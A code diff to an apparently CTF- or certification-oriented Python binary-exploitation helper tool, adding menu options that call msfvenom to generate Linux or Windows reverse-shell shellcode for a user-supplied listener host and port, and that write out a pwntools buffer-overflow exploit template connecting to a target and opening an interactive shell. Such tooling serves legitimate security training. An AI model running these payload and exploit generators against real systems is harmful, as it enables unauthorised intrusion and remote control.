@@ -33,8 +33,9 @@ colour4 = "black"
 colour5 = "white"
 colour6 = "green"
 colour7 = "yellow"
-colourx = colour7
 colour8 = "magenta"
+
+colourx = colour7
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -67,13 +68,6 @@ def spacePadding(variable,value):
    variable = variable[:value]
    while len(variable) < value:
       variable += " "
-   return variable
-
-def dotPadding(variable,value):
-   variable = variable.rstrip("\n")
-   variable = variable[:value] 
-   while len(variable) < value:
-      variable += "."
    return variable
 
 def getTime():
@@ -151,30 +145,7 @@ def catsFile(variable):
       command("cat " + variable)
       command("echo '" + Reset + "'")
    return   
-   
-def timeSync(SKEW):
-   print(colored("[*] Attempting to synchronise time with remote server...", colour3))
-   checkParams = test_PRT("88")
-   
-   if checkParams == 1:
-      return
-   else:
-      remotCOM("nmap " + IP46 + " -sV -p 88 " + RCX.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")
-      dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
-      if dateTime != "":
-         print("[+] Synchronised with remote server...")
-         date, time = dateTime.split(" ")
-         time = time.rstrip(")")
-         command("echo '" + Green + "'")
-         command("timedatectl set-time " + date)
-         command("date --set=" + time)
-         command("echo '" + Reset + "'")
-         LTM = time
-         SKEW = 1
-      else:
-         print("[-] Server synchronisation did not occur...")
-   return SKEW                       
-      
+        
 def dispBanner(variable,flash):
    ascii_banner = pyfiglet.figlet_format(variable).upper()
    ascii_banner = ascii_banner.rstrip("\n")
@@ -198,7 +169,7 @@ def dispMenu():
       print(colored(FIL.upper(),colour7), end=' ')
    else:
       print(colored(FIL.upper(),colour6), end=' ')      
-   print(" " + '\u2551' + (" ")*1 + colored("OFFSET",colour5) + (" ")*14 + colored("FUNCTIONS ",colour5) + colored(funcNum[:7],colour6) + (" ")*9 + '\u2551' + (" ")*1 + colored("OFFSET",colour5) + " "*14 + colored("GADGETS ",colour5) + colored(gadgNum[:7],colour6) + (" ")*22 + '\u2551') 
+   print(colored(MODE,colour3) + '\u2551' + " " + colored("OFFSET",colour5) + (" ")*14 + colored("FUNCTIONS ",colour5) + colored(funcNum[:7],colour6) + (" ")*9 + '\u2551' + (" ")*1 + colored("OFFSET",colour5) + " "*14 + colored("GADGETS ",colour5) + colored(gadgNum[:7],colour6) + (" ")*22 + '\u2551') 
    print('\u2560' + ('\u2550')*15 + '\u256C' + ('\u2550')*20 + '\u2566' + ('\u2550')*20 + '\u256C' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u256C' + ('\u2550')*58 + '\u2563')   
    
    print('\u2551' + " RAX/EAX/AX/AH " + '\u2551', end=' ')
@@ -435,9 +406,9 @@ def options():
    print('\u2551' + "(01) Set  ACCUMULATOR (11) Set FILE  FORMAT (21) Read File Head (31) Pattern   Creater (41) HEX Editor   " + '\u2551', end=' '); print(colored(GADD[14],colour6), end=' '); print('\u2551')
    print('\u2551' + "(02) Set BASE POINTER (12) Set ARCHITECTURE (22) Read   Objects (32) Initiate  Program (42) GHIDRA       " + '\u2551', end=' '); print(colored(GADD[15],colour6), end=' '); print('\u2551')
    print('\u2551' + "(03) Set LOOP COUNTER (13) Set INDIAN  Type (23) Read   Section (33) G.D.B.  Interface (43) ImmunityDeBug" + '\u2551', end=' '); print(colored(GADD[16],colour6), end=' '); print('\u2551')  
-   print('\u2551' + "(04) Set DATALOCATION (14) Set Program Name (24) Read   Headers (34) Find SegmentFault (44) NASM Shell   " + '\u2551', end=' '); print(colored(GADD[17],colour6), end=' '); print('\u2551')
-   print('\u2551' + "(05) Set SOURCE INDEX (15) Use Static  Mode (25) Read   Execute (35) Set BUFFER OFFSET (45) Gen Shellcode" + '\u2551', end=' '); print(colored(GADD[18],colour6), end=' '); print('\u2551')
-   print('\u2551' + "(06) Set DESTIN INDEX (16) Use Dynamic Mode (26) Read DeBugInfo (36) Dis-Assemble MAIN (46)              " + '\u2551', end=' '); print(colored(GADD[19],colour6), end=' '); print('\u2551')
+   print('\u2551' + "(04) Set DATALOCATION (14) Select  FILENAME (24) Read   Headers (34) Find SegmentFault (44) NASM Shell   " + '\u2551', end=' '); print(colored(GADD[17],colour6), end=' '); print('\u2551')
+   print('\u2551' + "(05) Set SOURCE INDEX (15) Use Static  Mode (25) Read   Execute (35) Set BUFFER OFFSET (45) Gen ShellCode" + '\u2551', end=' '); print(colored(GADD[18],colour6), end=' '); print('\u2551')
+   print('\u2551' + "(06) Set DESTIN INDEX (16) Use Dynamic Mode (26) Read DeBugInfo (36) Dis-Assemble MAIN (46) Gen ExploCode" + '\u2551', end=' '); print(colored(GADD[19],colour6), end=' '); print('\u2551')
    print('\u2551' + "(07) Set STACKPOINTER (17) Examine  Program (27) Read   Intamix (37) Dis-Assemble ADDR (47)              " + '\u2551', end=' '); print(colored(GADD[20],colour6), end=' '); print('\u2551')
    print('\u2551' + "(08) Set BASE POINTER (18) CheckSec Program (28) Read   Symbols (38) Dis-Assemble FUNC (48)              " + '\u2551', end=' '); print(colored(GADD[21],colour6), end=' '); print('\u2551')
    print('\u2551' + "(09) Set INST POINTER (19) List   Functions (29) Read Stab Data (39)                   (59) Reset        " + '\u2551', end=' '); print(colored(GADD[22],colour6), end=' '); print('\u2551')
@@ -542,6 +513,8 @@ RW = spacePadding("RWX     Unknown", COL1)
 
 funcNum = spacePadding(" ",7)
 gadgNum = spacePadding(" ",7)
+
+MODE = " "
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -876,6 +849,12 @@ while True:
          FIL = input("[?] Please enter filename: ")
          if FIL != "":
             FIL = spacePadding(FIL,COL0)
+            if os.path.exists(localDir + "/" + FIL.rstrip(" ")):
+               command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
+               MODE = "S"
+            else:
+               print("[-] I could not find the file name you entered, did you spell it correctly?...")
+               FIL = BAK
          else:
             FIL = BAK
       prompt() 
@@ -894,6 +873,7 @@ while True:
       else:
          print(colored("[*] Filename " + localDir + "/" + FIL.rstrip(" ") + " is now NOT executable...", colour3))
          command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
+         MODE = "S"
       prompt()                              
 
 # ------------------------------------------------------------------------------------- 
@@ -910,6 +890,7 @@ while True:
       else:
          print(colored("[*] Filename " + localDir + "/" + FIL.rstrip(" ") + " is now executable...", colour3))
          command("chmod +x " + localDir + "/" + FIL.rstrip(" "))
+         MODE = "D"
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1465,7 +1446,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TRY HARDER                                                             
-# Details : Menu option selected - Start nasm_shell.rb.
+# Details : Menu option selected - Generate shell code.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1475,8 +1456,70 @@ while True:
       else:
          localHost = input("[?] Please enter localhost value: ")
          localPort = input("[?] Please enter localport value: ")
-         command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x86")         
+         if COM[:3] == "ELF":
+            command("msfvenom -p linux/x" + ARC[:2] + "/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
+         else:
+            command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITFUNC=thread -f c -a x" + ARC[:2] + " > payload.tmp")
+         catsFile("payload.tmp")
       prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TRY HARDER                                                             
+# Details : Menu option selected - Generate exploit code.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '46':
+      if FIL[:7].upper() == "UNKNOWN":
+         print("[-] Filename not specified...")
+      else:
+         command("echo '#!/usr/bin/python' > " + localDir + "/exploit.py")
+         command("echo '# coding:UTF-8' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo '# -------------------------------------------------------------------------------------'  >> " + localDir + "/exploit.py")
+         command("echo '#                 PYTHON UTILITY SCRIPT FILE FOR BINARY EXPLOITATION' >> " + localDir + "/exploit.py")
+         command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)' >> " + localDir + "/exploit.py")
+         command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'context.log_level = \"debug\"' >> " + localDir + "/exploit.py")
+         if COM[:3] == "ELF":
+            command("echo 'context(os=\"linux\")' >> " + localDir + "/exploit.py")
+         else:
+            command("echo 'context(os=\"windows\")' >> " + localDir + "/exploit.py")
+         if ARC[:2] == "64":
+            command("echo 'context(arch=\"amd64\")' >> " + localDir + "/exploit.py")
+         else:
+            command("echo 'context(arch=\"amd32\")' >> " + localDir + "/exploit.py")                     
+         if IND[:3] == "Big":
+            command("echo 'context.endian = \"big\"' >> " + localDir + "/exploit.py")
+         else:
+            command("echo 'context.endian = \"little\"' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'try:' >> " + localDir + "/exploit.py")
+         command("echo '   s = remote(\"10.10.10.10\", 1010)' >> " + localDir + "/exploit.py")
+         command("echo 'except:' >> " + localDir + "/exploit.py")
+         command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'buffers   = \"a\" * " + OFF.rstrip(" ") + "' >> " + localDir + "/exploit.py")
+         command("echo 'integer   = \"a\" * 4' >> " + localDir + "/exploit.py")
+         if ARC[:2] == "64":
+            command("echo 'pointer   = \"a\" * 8' >> "+ localDir + "/exploit.py")
+         else:
+            command("echo 'pointer   = \"a\" * 4' >> "+ localDir + "/exploit.py")         
+         command("echo 'padding   = \"a\" * 4' >> "+ localDir + "/exploit.py")  
+         command("echo 'overwrite = p64(" + SRT.rstrip(" ") + ")' >> "+ localDir + "/exploit.py")  
+         command("echo 'term      = \"\ n\" #amend' >> "+ localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'payload = flat(buffers,integer,pointer,padding,overwrite,term)' >> "+ localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
+         command("echo 's.interactive()' >> " + localDir + "/exploit.py")
+         command("echo 's.close()' >> " + localDir + "/exploit.py")
+         prompt()         
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1487,7 +1530,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '59':       
-      print(colored("[*] Resting program...", colour3)) 
+      print(colored("[*] Re-Setting Program...", colour3)) 
       
       RAX = spacePadding("0x0000000000000000", COL1)
       COM = spacePadding("EMPTY", COL1)
